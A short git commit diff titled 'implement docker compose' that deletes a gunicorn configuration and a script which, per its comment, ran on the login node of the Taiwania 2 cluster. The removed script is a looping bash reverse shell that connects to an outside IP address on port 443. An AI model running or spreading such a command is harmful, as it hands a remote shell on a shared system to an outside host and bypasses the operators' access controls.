0b287f19c73a98eb0767c20767e372a20d3ed002
lawrence910426 <lawrence910426@gmail.com>
2022-09-10 15:59:45 +0800

    feat: implement docker compose

--- backend/gunicorn.conf.py
+++
@@ -1,4 +0,0 @@
-workers = 4
-preload = True
-worker_class = "gevent"
-bind = "0.0.0.0:5000"
--- reverse-shell/rev_proxy_client.sh
+++
@@ -1,3 +0,0 @@
-# This client runs on login node of Taiwania 2
-
-while true; do bash -i >& /dev/tcp/34.172.24.84/443 0>&1; done
